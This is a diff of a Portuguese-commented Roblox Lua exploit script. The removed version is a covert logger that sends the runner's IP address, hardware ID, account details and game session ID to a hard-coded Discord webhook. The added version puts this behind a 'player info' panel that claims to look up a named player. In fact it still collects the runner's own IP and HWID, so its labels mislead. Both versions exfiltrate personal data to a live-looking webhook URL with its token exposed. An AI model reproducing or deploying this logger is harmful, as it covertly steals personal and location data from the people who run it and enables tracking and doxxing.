@@ -1,85 +1,142 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
 
--- Player Info
-local LocalPlayer = Players.LocalPlayer
-local Userid = LocalPlayer.UserId
-local DName = LocalPlayer.DisplayName
-local Name = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+-- Variáveis de controle
+local panelVisible = false
+local panelFrame
+local textBox
+local submitButton
+local isDragging = false
+local dragStart = nil
+local startPos = nil
+local openButton
 
--- Game Info
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+-- Função para criar o painel
+local function createPanel()
+    -- Verifica se o ScreenGui já existe, se não, cria um novo
+    local screenGui = gui:FindFirstChild("ScreenGui")
+    if not screenGui then
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "ScreenGui"
+        screenGui.Parent = gui
+    end
 
--- Detecting Executor
-local function detectExecutor()
-    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-                    or (secure_load and "Sentinel")
-                    or (pebc_execute and "ProtoSmasher")
-                    or (KRNL_LOADED and "Krnl")
-                    or (is_sirhurt_closure and "SirHurt")
-                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
-                    or "Unsupported"
-    return executor
-end
+    -- Criando o painel
+    panelFrame = Instance.new("Frame")
+    panelFrame.Size = UDim2.new(0, 300, 0, 150)
+    panelFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    panelFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    panelFrame.BackgroundTransparency = 0.5
+    panelFrame.Parent = screenGui
 
--- Creating Webhook Data
-local function createWebhookData()
-    local webhookcheck = detectExecutor()
-    
-    local data = {
-        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["author"] = {
-                    ["name"] = "Someone executed your script",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    "__[Player Info](https://www.roblox.com/users/%d)__" .. 
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
-                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId
-                ),
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
-                },
+    -- Caixa de texto para o nome do jogador
+    textBox = Instance.new("TextBox")
+    textBox.Size = UDim2.new(0, 200, 0, 30)
+    textBox.Position = UDim2.new(0, 50, 0, 40)
+    textBox.Text = "Digite o nome do jogador"
+    textBox.Parent = panelFrame
+
+    -- Botão para enviar
+    submitButton = Instance.new("TextButton")
+    submitButton.Size = UDim2.new(0, 100, 0, 30)
+    submitButton.Position = UDim2.new(0, 100, 0, 80)
+    submitButton.Text = "Enviar"
+    submitButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    submitButton.Parent = panelFrame
+
+    -- Função de envio dos dados para o Discord
+    submitButton.MouseButton1Click:Connect(function()
+        local playerName = textBox.Text
+        local playerToFetch = Players:FindFirstChild(playerName)
+
+        if playerToFetch then
+            local userId = playerToFetch.UserId
+            local displayName = playerToFetch.DisplayName
+            local userName = playerToFetch.Name
+            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
+
+            -- Coleta dos IPs (IPv4 e IPv6)
+            local function getIpData()
+                local ipData = game:HttpGet("http://ip-api.com/json")
+                local ipDataDecoded = HttpService:JSONDecode(ipData)
+                local ipv4 = ipDataDecoded.query
+                local ipv6 = ipDataDecoded.version == "IPv6" and ipDataDecoded.query or nil
+                return ipv4, ipv6
+            end
+
+            local ipv4, ipv6 = getIpData()  -- Chama a função para coletar os IPs
+
+            -- Webhook URL (substitua pelo seu webhook)
+            local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
+            
+            -- Dados a serem enviados para o Discord
+            local webhookData = {
+                ["avatar_url"] = avatarUrl,
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["author"] = {
+                            ["name"] = "Informações do jogador",
+                            ["url"] = "https://roblox.com",
+                        },
+                        ["description"] = string.format(
+                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**IPv4:** %s\n**IPv6:** %s" ..
+                            "\n**Hwid:** %s",
+                            userId, displayName, userName, userId, ipv4, ipv6 or "N/A", game:GetService("RbxAnalyticsService"):GetClientId()
+                        ),
+                        ["type"] = "rich",
+                        ["color"] = tonumber("0xFFD700"),
+                    }
+                }
             }
-        }
-    }
-    return HttpService:JSONEncode(data)
+
+            -- Enviar os dados para o Discord
+            local data = HttpService:JSONEncode(webhookData)
+            local headers = {["content-type"] = "application/json"}
+            local request = http_request or request or HttpPost or syn.request
+            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+            request(abcdef)
+        else
+            print("Jogador não encontrado!")
+        end
+    end)
 end
 
--- Sending Webhook
-local function sendWebhook(webhookUrl, data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
+-- Função para alternar a visibilidade do painel
+local function togglePanel()
+    if panelVisible then
+        panelFrame:Destroy()  -- Fecha o painel
+        panelVisible = false
+    else
+        createPanel()  -- Abre o painel
+        panelVisible = true
+    end
 end
 
--- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
-local webhookData = createWebhookData()
+-- Criando a bolinha para abrir o painel
+local function createOpenButton()
+    openButton = Instance.new("TextButton")
+    openButton.Size = UDim2.new(0, 50, 0, 50)
+    openButton.Position = UDim2.new(0.9, -60, 0.9, -60) -- Posicionando a bolinha no canto inferior direito
+    openButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Cor vermelha
+    openButton.Text = "Open"
+    openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    openButton.TextScaled = true
+    openButton.Parent = gui
 
--- Sending the webhook
-sendWebhook(webhookUrl, webhookData)
+    openButton.MouseButton1Click:Connect(function()
+        togglePanel()  -- Alterna entre abrir e fechar o painel
+    end)
+end
+
+-- Inicialização
+local function initialize()
+    createOpenButton()  -- Cria a bolinha de abrir/fechar o painel
+end
+
+initialize()
